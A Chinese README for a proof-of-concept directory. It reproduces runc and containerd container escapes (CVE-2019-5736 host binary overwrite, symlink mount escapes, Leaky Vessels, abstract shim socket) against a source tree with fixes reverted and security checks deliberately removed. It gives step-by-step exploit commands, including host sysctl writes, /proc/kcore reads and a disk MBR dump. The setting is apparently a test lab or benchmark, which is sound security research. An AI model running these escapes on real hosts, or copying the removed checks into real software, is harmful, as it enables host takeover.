# poc/ — 漏洞复现脚本与配置

**不收录**编译产物与测试 rootfs——它们都能从本目录源码 + 仓库源码重建。

---

## 目录结构

```
poc/
├── README.md
├── common/                      # 共享模板
│   ├── gen_cfg.py               #   基础 OCI config 生成器（maskedPaths/readonlyPaths 已清空）
│   ├── base_config.json         #   基础配置输出（多个 CVE 的种子）
│   └── rootfs_config.json       #   rootfs 模板（21626 系列引用）
├── CVE-2019-5736/               # runc 宿主二进制覆写（完整 PoC）
├── CVE-2019-19921/              # /proc /sys 符号链接挂载逃逸（差分）
├── CVE-2021-30465/              # mount 目标 TOCTOU（差分 + hook）
├── CVE-2021-43784/              # netlink 长度溢出（差分）
├── CVE-2024-21626/              # fd/工作目录逃逸（机制验证）
├── CVE-2020-15257/              # shim abstract socket（差分）
├── INJ-A1-caps/                 # 新增A1 能力降级（config + 观察脚本）
├── INJ-A4-maskpaths/            # 新增A4 掩蔽/只读路径失效（config）
├── INJ-A6-sysctl/               # 新增A6 sysctl 白名单失效（config）
├── INJ-A8-devices/              # 新增A8 设备过滤失效（config）
└── INJ-B2-privileged/           # 新增B2 privileged 判定失效（CRI 流程说明）
```

CVE-2021-43816 无独立脚本（仅静态确认），见文末对应小节。
5 个新增漏洞（A1/A4/A6/A8/B2）的 PoC 见文末「新增漏洞的 PoC」章节。

---

## 运行模型与通用流程

**这些脚本不是"一键 exploit"**。runc/containerd 源码树里已埋入漏洞，脚本只负责两件事：
把 runc 逼到不该走的代码路径（恶意 config.json / 容器内恶意程序），并采集证据
（挂载表 / 错误消息 / fd 输出 / 二进制覆写）。真正的"攻击动作"由 **runc 进程本身**在执行
正常的建容器流程时触发。

三类脚本，运行方式不同：

| 类型 | 脚本 | 你运行什么 | 漏洞触发者 |
|---|---|---|---|
| 配置生成器 | `gen*.py` | `python3 gen30465b.py` → 产出 `config.json` | 之后 `runc-vuln create` 读它时 |
| 容器内恶意程序 | `5736_exploit.c` | 编译后放进 rootfs，作为容器 init 被 runc 启动 | runc re-exec / `runc-vuln exec` |
| 独立 demo | `cmd-shim-demo/main.go` | `go build` 后直接运行 server/client | containerd shim 的 socket 代码 |

### OCI bundle 与统一调用

runc 从一个 **OCI bundle**（目录 = `config.json` + `rootfs/`）创建容器，namespace、mount、
caps、netlink 引导、进程启动全在 runc 进程内发生：

```bash
/tmp/bundle/
├── config.json     # 各 CVE 的 config 文件（改名 config.json 放入 bundle，root.path 指向 rootfs）
└── rootfs/         # 恶意 rootfs（符号链接 / /exploit 等按 CVE 准备）

runc-vuln create --bundle /tmp/bundle <name>    # 漏洞版
runc-vuln start <name>                          # 或一步: runc-vuln run --bundle ... <name>
runc-fixed create ...                           # 修复版对照（差分）
```

各 config 内 `root.path` 是绝对路径（如 `/tmp/rootfs-30465`），需按它准备好 rootfs。

> **运行环境**：这些 PoC 在 `runc-vuln-test` 特权容器（docker-in-docker）里运行——它以 root +
> cgroup 权限创建真实容器（普通机器非 root 无法创建容器）。`runc-vuln` / `runc-fixed` /
> `runc-vuln-test` 名称即指此环境与其中的二进制。

**差分**：同一 bundle 分别用 `runc-vuln`（回退出漏洞）与 `runc-fixed`（修复版）跑，对比结果
即漏洞复现证据。

---

## CVE-2019-5736 — runc 宿主二进制覆写 ✅ 完整 PoC

| 文件 | 说明 |
|---|---|
| `5736_exploit.c` | 主 exploit：shebang 触发 re-exec → 扫描 `/proc/<pid>/exe` 拿宿主 runc fd → ETXTBSY 窗口关闭后覆写二进制 |
| `5736_exploit2.c` | 带 `/tmp/exploit-log` 日志的调试变体 |
| `5736_diag.c` | 诊断工具 |
| `evil_config.json` | 恶意容器配置（`process.args = ["/exploit"]`，exploit 作为容器 init 运行） |

**构建**：

```bash
gcc -static -o 5736_exploit 5736_exploit.c
# 编译产物放入容器 rootfs 根，命名 /exploit，与 evil_config.json 对应
```

**前置**：`/usr/local/bin/runc-vuln` 是宿主 `/tmp/runc-vuln` 的 bind mount（容器内写穿即改宿主二进制）。

**验证证据**：覆写后执行 payload 产出 `/tmp/5736-pwned.txt`（`CVE-2019-5736 PWNED host runc`）。

**复现步骤**：

```bash
# 1. 编译 exploit → 恶意 rootfs 的 /exploit；evil_config.json 作 config.json
gcc -static -o /tmp/rootfs-evil/exploit 5736_exploit.c
cp evil_config.json /tmp/bundle-evil/config.json
# 2. 启动恶意容器（init = /exploit：改写容器内 /bin/sh 为 shebang，进入扫描循环）
runc-vuln create --bundle /tmp/bundle-evil evil && runc-vuln start evil
# 3. 受害者触发：runc exec 一个 /bin/sh → shebang 让内核 exec runc 本体 → 短命 runc 进程
runc-vuln exec evil /bin/sh
# 4. exploit 抓到该进程，等宿主无进程映射二进制（ETXTBSY 解除）后覆写
cat /tmp/5736-pwned.txt     # CVE-2019-5736 PWNED host runc
# 恢复：cat /usr/local/bin/runc-vuln.bak > /usr/local/bin/runc-vuln
```

> 触发要求 `create`/`start` 都已退出、`exec` 的 runc 进程短命退出，宿主上才没有进程保持该
> 二进制被映射，`O_WRONLY|O_TRUNC` 重开才能穿过 ETXTBSY 窗口。

---

## CVE-2019-19921 — /proc /sys 符号链接挂载逃逸 ✅ 差分

| 文件 | 说明 |
|---|---|
| `c19921_config.json` | rootfs 内 `/sys -> /host-escape` 的恶意容器配置 |

rootfs 内 `/sys` 替换为指向宿主目录的符号链接时：修复版拒绝
（`filesystem "sysfs" must be mounted on ordinary directory`），回退版裸 `mount(2)`
跟随符号链接把 sysfs 挂到宿主 `/host-escape`。

**复现步骤**：

```bash
# 1. 造恶意 rootfs：/sys → 宿主目录符号链接
mkdir -p /tmp/rootfs-19921 /host-escape
ln -s /host-escape /tmp/rootfs-19921/sys
# 2. c19921_config.json 作 config.json（root.path=/tmp/rootfs-19921）
cp c19921_config.json /tmp/bundle-19921/config.json
runc-vuln create --bundle /tmp/bundle-19921 c19921
# 3. 差分
#    vuln : mount(2) 跟随符号链接 → sysfs 落到宿主 /host-escape
#    fixed: "filesystem "sysfs" must be mounted on ordinary directory"
ls /host-escape      # vuln 下出现 sysfs 内容
```

> CVE-2023-27561 是同一代码路径的回归（`mountToRootfs` 的 `case "proc","sysfs"`），
> 本配置与 19921 复现时共用。

---

## CVE-2021-30465 — mount 目标 TOCTOU ✅ 差分

| 文件 | 说明 |
|---|---|
| `gen30465.py` / `gen30465b.py` | 生成器：基于 `c19921_config.json` 加 bind mount（dest 为符号链接 `→ /host-escape`） |
| `c30465_config.json` | 差分构造（无 hook） |
| `c30465b_config.json` | 带 `CreateContainer` hook：`cat /proc/self/mountinfo > /tmp/hook-mount-30465b.txt` 抓 pivot_root 前挂载表 |

**生成**：

```bash
python3 gen30465b.py    # 需要同目录 c19921_config.json
```

回退版 `mount(2)` 跟随目标符号链接把挂载落在宿主路径 `/host-escape`；修复版
`WithProcfd`+`SecureJoin` 把绝对符号链接 re-root 回 rootfs 内。

**复现步骤**：

```bash
# 1. 生成带 hook 的 config
python3 gen30465b.py                 # → c30465b_config.json
# 2. rootfs 埋符号链接 + bind 源
mkdir -p /tmp/rootfs-30465/tmp /tmp/data
ln -s /host-escape /tmp/rootfs-30465/tmp/escape
# 3. c30465b_config.json 作 config.json，创建容器
cp c30465b_config.json /tmp/bundle-30465/config.json
runc-vuln create --bundle /tmp/bundle-30465 c30465
# 4. 读 hook 抓的 pre-pivot 挂载表（pivot_root 后逃逸挂载会被 put_old 清理）
cat /tmp/hook-mount-30465b.txt
#    挂载点 /host-escape                     → vuln（逃逸到宿主）
#    挂载点 /tmp/rootfs-30465/host-escape    → fixed（SecureJoin 圈回 rootfs 内）
```

> hook 用 `CreateContainer`：runc 保证它在所有挂载完成后、pivot_root 之前运行，此时旧根仍
> 可见，hook 把此刻挂载表落盘——这是观察逃逸挂载落点的关键窗口。

---

## CVE-2021-43784 — netlink 长度溢出 ✅ 差分

| 文件 | 说明 |
|---|---|
| `gen43784.py` / `gen43784b.py` | 生成器：声明 user ns + 6000 条 uidMappings（72000 B > UINT16_MAX） |
| `c43784_config.json` | 生成的巨型 config（约 600 KB） |

**生成**：

```bash
python3 gen43784b.py    # 需要同目录 c19921_config.json
```

修复版报 `netlink: cannot serialize bytemsg of length 70895`；回退版静默截断产生
`unknown netlink message type 14137`（70895→5359 破坏引导消息结构）。

**复现步骤**：

```bash
# 1. 生成 config（user ns + 6000 条 uidMappings）
python3 gen43784b.py                 # → c43784_config.json
# 2. 作 config.json 创建容器
cp c43784_config.json /tmp/bundle-43784/config.json
runc-vuln create --bundle /tmp/bundle-43784 c43784
# 3. 差分 create 报错
#    vuln : unknown netlink message type 14137（uint16 截断，绕过检查）
#    fixed: cannot serialize bytemsg of length 70895（panic 防护拒绝）
```

---

## CVE-2024-21626 — fd/工作目录逃逸（Leaky Vessels）⚠️ 机制验证

| 文件 | 说明 |
|---|---|
| `gen_cfg2.py` ~ `gen_cfg7.py` | 六版 fd 扫描/触发配置生成器（基于 `rootfs_config.json`） |
| `cfg_21626.json` | 生成的扫描配置 |

standalone runc 无法触发完整逃逸（需 containerd 传递 cgroup fd），验证为机制级：
4 层修复（`CloseExecFrom(3)`/`verifyCwd()`/`UnsafeCloseFrom`/cgroupFd `O_CLOEXEC`）
全部确认已 revert。生成器扫描容器内 `/proc/self/fd/*`，尝试 `cd` 泄露的 cgroup fd。

**复现步骤**：

```bash
# 1. 生成 fd 扫描 config（gen_cfg6.py 读环境变量 CG 定 cgroupsPath）
CG=/ctf python3 gen_cfg6.py         # → cfg_21626.json
# 2. 作 config.json 启动容器（args 是一段遍历 /proc/self/fd/* 尝试 cd 的 shell）
cp cfg_21626.json /tmp/bundle-21626/config.json
runc-vuln run --bundle /tmp/bundle-21626 leaky
# 3. 看容器 stdout
#    "LEAKED FD: <fd> -> ...cgroup..." / "CD-OK" → fd 未关闭（漏洞态）
#    修复态下这些 fd 被 CloseExecFrom / O_CLOEXEC 清掉，无输出
```

---

## CVE-2020-15257 — shim abstract socket ✅ 差分（真实 containerd 代码）

| 文件 | 说明 |
|---|---|
| `cmd-shim-demo/main.go` | 最小 demo：`shim.NewSocket`（server）vs `shim.AnonDialer`（client） |

> **上游修复**：commit `4a4bb851`（GHSA-36xw-fx78-c5r4，"Use path based unix socket for shims"）。
> 仓库树已含 revert：`pkg/shim/util_unix.go` 的 `CreateSocketAddress` 返回 `/containerd-shim/<hash>.sock`
>（无 `unix://` 前缀 → `socket.path()` 补 `\x00` → abstract socket）。

**构建**（demo 依赖 `github.com/containerd/containerd/v2/pkg/shim`，需在 containerd 模块内）：

```bash
cd ../../containerd  # 或从模块上下文 go build
go build -o shim-demo ./path/to/cmd-shim-demo
# 用法: shim-demo server|client [address]
#   reverted: /containerd-shim/demo.sock   (无 unix:// → abstract)
#   fixed:    unix:///tmp/fs-socket.sock   (文件系统 socket, 0600)
```

**复现步骤**：

```bash
# 1. 构建 demo（见上）
# 2. 宿主跑 server（模拟 shim 监听 socket）
./shim-demo server /containerd-shim/demo.sock
# 3. --net=host 容器里跑 client（容器与宿主共享 netns）
./shim-demo client /containerd-shim/demo.sock
#    vuln : GOT: SHIM-SOCKET-REACHED（abstract socket：无路径/无权限保护，netns 共享可达）
#    fixed: DIAL FAILED: no such file or directory（文件系统 socket 0600 + mount ns 隔离）
```

---

## CVE-2021-43816 — SELinux relabel 移除 ⚠️ 静态（无脚本，仅源码 revert）

**上游修复**：commit `9b0303913`（"only relabel cri managed host mounts"，Michael Crosby 2021-11-09）。
仓库树已含 revert：移除 `WithRelabeledContainerMounts`，`containerMounts` 恢复 `SelinuxRelabel: true`
（`internal/cri/server/container_create.go`，对应测试中仍可见 `SelinuxRelabel: true`）。

需要 SELinux 启用内核才能动态验证，仅作源码级依据。

---

## 新增漏洞的 PoC（A1 / A4 / A6 / A8 / B2）

这 5 个植入**都是"删检查"**，已逐一在源码确认处于活跃漏洞态：

| 方案 | 删掉的检查 | 当前状态 |
|---|---|---|
| **A1** | `ApplyBoundingSet`/`ApplyCaps` 调用 | ✅ `init_linux.go` `finalizeNamespace` 直接没有 |
| **A4** | `MaskPaths`/`ReadonlyPaths` 循环 | ✅ `rootfs_linux.go` `finalizeRootfs` 里循环已删 |
| **A6** | 校验器 `checks` 列表的 `v.sysctl` | ✅ `validator.go` 校验函数还在但未注册 |
| **A8** | `setDevices` 整个 eBPF 生成+附加 | ✅ `fs2/devices.go` 现为 `return nil` 空函数 |
| **B2** | `if GetPrivileged()` 判定 | ✅ `container_create.go` `WithPrivileged` 无条件 |



A1/A4/A6/A8 用 standalone `runc-vuln` 复现（privileged 容器环境，root 运行）；B2 走
containerd CRI（见 `INJ-B2-privileged/README.md`）。

### A1 — 能力降级（`INJ-A1-caps/config.json`）

config 只请求 3 项最小 caps，漏洞态容器却保留宿主全部能力。

```bash
# rootfs 需含 busybox（mount/capsh 可选）
runc-vuln run --bundle INJ-A1-caps a1
# 期望输出（漏洞态）：
#   CapEff/CapBnd 为全 1 mask（0x1ffffffffff 等）；mount -t tmpfs 成功
# 对照 runc-fixed：CapEff 只有 0x20000420（AUDIT_WRITE|KILL|NET_BIND_SERVICE），mount 报 EPERM
```

### A4 — 掩蔽/只读路径失效（`INJ-A4-maskpaths/`）✅ 完整 PoC

config 带默认 maskedPaths（10 项）/ readonlyPaths（5 项），漏洞态不生效。
**完整 PoC**：容器内 `pwn.sh` 写宿主全局 `/proc/sys/vm/swappiness`（宿主可验证）+ 读
`/proc/kcore`、`/proc/sched_debug`；`run.sh` 一键编排 vuln/fixed 差分 + 复位宿主参数。

```bash
# rootfs 需含 busybox（sh/od/dd/head）；需 root / 特权容器环境
./INJ-A4-maskpaths/run.sh
#   vuln  : WRITE-OK（宿主 swappiness → 77）+ kcore/sched_debug 读到真实内容 + marker=A4-PWNED
#   fixed : WRITE-BLOCKED（/proc/sys 只读 remount）+ kcore/sched_debug 为空 + marker=A4-BLOCKED
# 宿主验证：run.sh 结束时 cat /proc/sys/vm/swappiness 已自动复位
# 影响：/proc/kcore 直读宿主物理内存、/proc/sys 可写（结合 A6 改 kernel.core_pattern → 宿主 RCE）
```

### A6 — sysctl 白名单失效（`INJ-A6-sysctl/config.json`）

config 声明 `linux.sysctl.kernel.randomize_va_space`（不在独立 kernel ns，本应被拒）。**已在
本环境实测差分**：

```bash
runc-vuln  create --bundle INJ-A6-sysctl a6   # 漏洞态：通过校验（走到后续 rootless/cgroup 步骤）
runc-fixed create --bundle INJ-A6-sysctl a6   # 修复态：sysctl "kernel.randomize_va_space"
                                              #         is not in a separate kernel namespace
# 真实攻击面：kernel.core_pattern → 宿主核心转储劫持 → root 命令执行
```

### A8 — 设备过滤失效（`INJ-A8-devices/`，cgroup v2）✅ 完整 PoC

config 用默认 deny-all 设备白名单（标准设备由 runc 运行时自动放行），漏洞态 eBPF 过滤不附加。
**完整 PoC**：容器内 `pwn.sh` 只读 dump 宿主磁盘 MBR（分区表 + 55AA 签名），`run.sh` 一键编排差分。

```bash
# rootfs 需含 busybox（sh/od/dd）；需 root / cgroup v2 环境
./INJ-A8-devices/run.sh
#   vuln  : READ-OK → 真实分区表 + 55AA 签名 + marker=A8-PWNED
#   fixed : mknod 成功但 dd 报 Permission denied（cgroup eBPF 过滤拒绝 /dev/sda）
# 本 PoC 只读磁盘零破坏；真实攻击可写穿 /dev/sda、/dev/mem、/dev/nvme*
# 注：只在 cgroup v2（unified hierarchy）下生效
```

### B2 — privileged 判定失效（`INJ-B2-privileged/README.md`）

普通容器被无条件误给 `WithPrivileged`（全能力 + 全设备 + 无 seccomp）。需要 containerd +
CRI + crictl 全链路，步骤见其目录内 README。

---
